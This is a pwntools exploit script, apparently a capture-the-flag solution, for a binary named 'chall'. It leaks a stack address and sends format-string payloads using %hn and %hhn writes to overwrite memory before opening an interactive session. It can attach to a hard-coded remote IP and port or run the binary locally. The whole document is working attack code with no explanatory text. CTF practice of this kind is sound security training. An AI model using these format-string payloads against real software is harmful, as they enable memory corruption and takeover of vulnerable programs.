#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+332

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('103.130.219.236', 5001)
else:
        p = process(exe.path)

GDB()
p.recvuntil(b"My stack: ")
stack = int(p.recvline(keepends=False),16)
target = stack + 0x10-1-1
sla(b'format: ',f"%c%{target & 0xffff}c%23$hn".encode())

sla(b'format: ',f"%49c%53$hhn".encode())
sla(b'format: ',f"cccccccccccccccc".encode())


p.interactive()
